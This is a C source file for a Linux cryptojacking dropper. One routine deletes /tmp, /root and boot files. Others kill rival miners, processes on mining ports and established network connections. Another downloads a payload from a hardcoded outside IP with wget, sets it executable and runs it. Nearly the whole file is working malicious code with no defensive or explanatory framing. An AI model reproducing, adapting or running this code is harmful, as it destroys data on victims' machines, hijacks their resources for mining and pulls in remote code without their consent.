#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define MINER_LOCATION "http://213.183.53.120/x" // Location
#define MINER_OUTPUT "/tmp/.omni/wicked"
#define WALLET_ADRESS "temp" // XMR Adress
#define POOL_ADRESS "temp:333" // XMR Pool (ip:port)

char *auxf_finds[] = {"mine.moneropool.com", "xmr.crypto-pool.fr:8080", "xmr.crypto-pool.fr:3333", "zhuabcn@yahoo.com", "monerohash.com", "/tmp/a7b104c270", "xmr.crypto-pool.fr:6666", "xmr.crypto-pool.fr:7777", "xmr.crypto-pool.fr:443", "stratum.f2pool.com:8888", "xmrpool.eu"};
char *pkill_me[] = {"minerd", "minergate", "cryptonight", "minexmr", "cryptonight"};
char *ports_drop[] = {"3333", "5555", "443", "7777", "6666", "9999", "8888", "13531", "25"};

void auxf_kill()
{
	int j = 0;
	char auxf_command[248];
	
	for(j = 0; j < 11; j++)
	{
		sprintf(auxf_command, "ps auxf | grep \"%s\" | awk '{print 2$}' | xargs kill -9", auxf_finds[j]);
		sleep(1);
		system(auxf_command);
	}
}

void pkill_kill()
{
	int x = 0;
	char pkill_command[248];
	
	for(x = 0; x < 5; x++)
	{
		sprintf(pkill_command, "pkill -9 %s", pkill_me[x]);
		sleep(1);
		system(pkill_command);
	}
}

void port_drop()
{
	int c = 0;
	char port_command[248];
	
	for(c = 0; c < 9; c++)
	{
		sprintf(port_command, "kill -9 $(lsof -i:%s | awk '{print $2}')", ports_drop[c]);
		sleep(1);
		system(port_command);
	}
}

void prep_device()
{
	system("rm -rf /tmp/* && rm -rf /root/* && rm -rf /boot/grub/deamon && rm -rf /boot/grub_disk_genius");
	sleep(1);
	system("mkdir /tmp/.omni/");
	sleep(1);
	system("kill -9 `lsof -t /tmp`");
	sleep(5);
	system("kill -9 `lsof -t /root`");
	sleep(5);
	system("kill -9 `netstat -p -t | grep \"ESTABLISHED\" | grep -v \"ESTABLISHED -\" | awk {'print $7}' | awk -F '/' {'print $1'}`");
}

void get_miner()
{
	char wget[248], execute[248];
	sprintf(wget, ">/tmp/.omni/.xxx && cd /tmp/.omni/; wget %s -O - > %s; chmod 777 %s", MINER_LOCATION, MINER_OUTPUT, MINER_OUTPUT);
	sprintf(execute, "sh %s", MINER_OUTPUT, WALLET_ADRESS, POOL_ADRESS);
	sleep(1);
	system(wget);
	sleep(15);
	system(execute);
}

int main(void)
{
	prep_device();
}